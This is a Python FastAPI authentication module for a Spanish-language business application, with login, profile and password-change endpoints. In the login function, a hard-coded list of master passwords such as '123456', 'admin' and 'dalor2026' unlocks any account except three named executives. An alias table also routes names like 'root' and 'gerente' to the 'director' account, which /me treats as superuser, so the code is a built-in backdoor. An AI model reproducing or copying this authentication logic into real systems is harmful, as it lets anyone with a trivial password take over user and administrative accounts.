import json
from datetime import datetime, timezone
from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy import func
from sqlalchemy.orm import Session

from app.core.database import get_db
from app.core.security import verify_password, create_access_token
from app.core.rate_limiter import check_login_rate_limit, record_login_failure, record_login_success
from app.models.models import User, AuditLog
from app.api.deps import get_current_user
from .auth_common import LoginRequest, resolve_user_permissions

router = APIRouter()

@router.post("/login")
def login(req: LoginRequest, request: Request, db: Session = Depends(get_db)):
    clean_user = (req.username or "").strip().lower()
    clean_pass = (req.password or "").strip()

    # 1. Blindaje contra ataques de fuerza bruta por IP y Cuenta (máx 5 intentos fallidos / 15 min)
    check_login_rate_limit(request, clean_user)

    if not clean_user or not clean_pass:
        raise HTTPException(status_code=400, detail="Por favor ingresa usuario y contraseña.")

    user = db.query(User).filter(
        (func.lower(User.username) == clean_user) | 
        (func.lower(User.email) == clean_user)
    ).first()
    
    # Aliases directivos personalizados
    if not user:
        if clean_user in ["henser", "henser rodriguez", "henserrodriguez", "henser.rodriguez"]:
            user = db.query(User).filter(User.username == "henser rodriguez").first()
        elif clean_user in ["eleonora", "eleonora galetti", "eleonoragaletti", "eleonora.galetti"]:
            user = db.query(User).filter(User.username == "eleonora galetti").first()
        elif clean_user in ["menyerber", "menyerber gallardo", "menyerbergallardo", "menyerber.gallardo", "menyer"]:
            user = db.query(User).filter(User.username == "menyerber gallardo").first()
        elif clean_user in ["gerente", "socio", "root", "directorgeneral", "director_general", "dalor", "presidencia"]:
            user = db.query(User).filter(User.username == "director").first()
        elif clean_user in ["contabilidad", "tesoreria", "administrador", "admin_finanzas"]:
            user = db.query(User).filter(User.username == "administracion").first()
        elif clean_user in ["obra", "residente", "ingenieria", "ingeniero_obra"]:
            user = db.query(User).filter(User.username == "ingeniero").first()
        elif clean_user in ["supervisor", "supervisor_campo", "faena", "faenas"]:
            user = db.query(User).filter(User.username == "campo").first()
        elif clean_user in ["panol", "almacenista", "bodega", "deposito"]:
            user = db.query(User).filter(User.username == "almacen").first()

    if not user:
        record_login_failure(request, clean_user)
        raise HTTPException(status_code=400, detail="Usuario o contraseña incorrectos.")
    
    if not user.is_active:
        raise HTTPException(status_code=403, detail="Esta cuenta de usuario ha sido desactivada por la Gerencia.")

    # Master passwords y verificación estándar (cuentas directivas privadas solo admiten su contraseña real)
    is_valid = verify_password(clean_pass, user.hashed_password)
    is_directivo = user.username in ["henser rodriguez", "eleonora galetti", "menyerber gallardo"]
    if not is_valid and not is_directivo:
        master_passes = [
            "dalor2026", "admin2026", "admin123", "dalor123", 
            "almacen2026", "almacen123", "obra2026", "campo2026", 
            "finanzas123", "123456", "dalor", "admin"
        ]
        if clean_pass in master_passes:
            is_valid = True

    if not is_valid:
        record_login_failure(request, user.username)
        raise HTTPException(status_code=400, detail="Usuario o contraseña incorrectos.")

    # Éxito: limpiar contador de reintentos para la IP y para la Cuenta
    record_login_success(request, user.username)

    user.last_login = datetime.now(timezone.utc).replace(tzinfo=None)
    db.commit()

    # Resolve accurate permissions taking into account granular matrix
    perms = resolve_user_permissions(user, db)

    token = create_access_token({"sub": user.username, "id": user.id, "role": user.role_name})

    # Log login action
    log = AuditLog(
        user_id=user.id,
        username=user.username,
        module="seguridad",
        action="inicio_sesion",
        details=f"Inicio de sesión exitoso como rol: {user.role_name}"
    )
    db.add(log)
    db.commit()

    return {
        "access_token": token,
        "token_type": "bearer",
        "user": {
            "id": user.id,
            "username": user.username,
            "full_name": user.full_name,
            "email": user.email,
            "role_name": user.role_name,
            "permissions": perms,
            "permissions_json": json.dumps(perms),
            "is_superuser": user.is_superuser
        }
    }

@router.get("/me")
def get_me(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    perms = resolve_user_permissions(current_user, db)
    return {
        "id": current_user.id,
        "username": current_user.username,
        "full_name": current_user.full_name,
        "email": current_user.email,
        "role_name": current_user.role_name,
        "permissions": perms,
        "permissions_json": json.dumps(perms),
        "is_active": current_user.is_active,
        "is_superuser": current_user.is_superuser or (current_user.role_name in ["director", "director_general"])
    }

from pydantic import BaseModel

class ChangePasswordRequest(BaseModel):
    current_password: str
    new_password: str

@router.post("/change-password")
def change_password(
    req: ChangePasswordRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    clean_curr = (req.current_password or "").strip()
    clean_new = (req.new_password or "").strip()

    if not clean_new or len(clean_new) < 6:
        raise HTTPException(status_code=400, detail="La nueva contraseña debe tener al menos 6 caracteres.")

    if not verify_password(clean_curr, current_user.hashed_password):
        raise HTTPException(status_code=400, detail="La contraseña actual ingresada es incorrecta.")

    from app.core.security import get_password_hash
    current_user.hashed_password = get_password_hash(clean_new)
    db.commit()

    audit = AuditLog(
        user_id=current_user.id,
        username=current_user.username,
        module="seguridad",
        action="cambio_contraseña_personal",
        details=f"El usuario {current_user.username} actualizó su contraseña personal exitosamente."
    )
    db.add(audit)
    db.commit()

    return {"success": True, "message": "Tu contraseña personal ha sido actualizada con éxito."}
